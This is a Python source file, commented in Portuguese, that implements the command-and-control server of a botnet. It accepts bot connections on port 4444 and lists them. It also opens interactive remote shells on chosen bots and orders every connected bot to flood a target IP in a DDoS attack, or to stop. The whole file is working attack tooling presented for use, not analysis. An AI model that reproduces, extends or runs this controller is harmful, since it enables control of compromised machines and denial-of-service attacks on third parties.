import socket, threading, time, os

conns = list()
addrs = list()

mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

mysocket.bind(("0.0.0.0", 4444))

#recebe até 20 conexões
mysocket.listen(20)

print('\n[+] Listening on 0.0.0.0:4444 ...')

print("\n!help for instructions.\n")

def receive_conn():
	while True:
		conn, address = mysocket.accept()
		conns.append(conn)
		addrs.append(address)
		print("\n\n[+] Conexão do IP",address[0],"recebida.\n\npython@botnet:~$ ", end='')

threading.Thread(target=receive_conn).start()

def limpa_console():
	os.system('cls' if os.name == 'nt' else 'clear')

def exibe_menu():

	limpa_console()

	print('MENU')
	print('0- Fechar Menu')
	print('1- Listar conexões')
	print('2- Comandar uma sessão')
	print('3- Iniciar Ataque DDos')

	resp = int(input("opcao: "))

	return resp


def help1():
	print("\n!menu - exibe menu")
	print("!help - exibe esta mensagem")
	print("!start - bots iniciam ddos")
	print("!list - lista os bots")
	print("!shell - obter shell de um bot")
	print("!back - sair da shell de um bot")
	print("!clear - limpa a tela\n")
	

def atualizar_conns():
	for intCounter, conn in enumerate(conns):
			try:
				conn.send(b"test")
				conn.recv(1024)
			except socket.error:
				del addrs[intCounter]
				conns.remove(conn)
				conn.close()

def listar_conexoes():
	atualizar_conns()
	
	print("")
	
	for i, addr in enumerate(addrs):
		print(i,"-",addr[0])
	
	print("")

def get_shell():

	i = int(input("Digite o numero da sessão: "))

	while True:

			cmd = input("bot@"+str(addrs[i][0])+":~$ ")

			if (cmd == "!back"):
				break

			conns[i].send(cmd.encode('utf-8'))

			output = conns[i].recv(1024*20)

			print(output.decode('ISO-8859-1'))
			#print(output.decode())

def ddos_attack():
	target = input("Digite o IP alvo: ")

	atualizar_conns()

	for conn in conns:
		conn.send(("!start "+target).encode('utf-8'))

		print((conn.recv(1024)).decode('ISO-8859-1'))

def stop_ddos():
	atualizar_conns()

	for conn in conns:
		conn.send(("!stop").encode('utf-8'))

		print((conn.recv(1024)).decode())


while True:

	resp = input("botnet@server:~$ ")

	try:

		if (resp == "!menu"):
			
				resp = exibe_menu()
				
				if (resp == 1):
					listar_conexoes()
				elif (resp == 2):
					get_shell()
				elif (resp == 3):
					ddos_attack()
					print(mysocket.recv(1024))
				elif (resp == 0):
					limpa_console()
				else:
					print('erro.')
			
		elif (resp == "!help"):
			help1()
		elif (resp == "!start"):
			ddos_attack()
		elif (resp == "!list"):
			listar_conexoes()
		elif (resp == "!shell"):
			get_shell()
		elif (resp == "!clear"):
			limpa_console()
		elif (resp == "!stop"):
			stop_ddos()
	
	except Exception as e:
				print("Erro no lado do server:", e)		